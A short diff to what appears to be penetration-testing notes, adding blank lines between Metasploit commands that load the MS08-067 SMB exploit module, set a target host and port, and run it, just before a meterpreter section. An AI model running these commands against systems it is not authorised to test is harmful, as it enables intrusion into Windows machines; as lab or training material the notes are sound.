@@ -14,8 +14,11 @@
 
 ##### Attack SMB for Windows
 `msf > use exploit/windows/smb/ms08_067_netapi`
+
 `msf exploit(ms08_067_netapi) > set RHOST 10.37.129.9`
+
 `msf exploit(ms08_067_netapi) > set RPORT 445`
+
 `msf exploit(ms08_067_netapi) > exploit`
 
 #### meterpreter
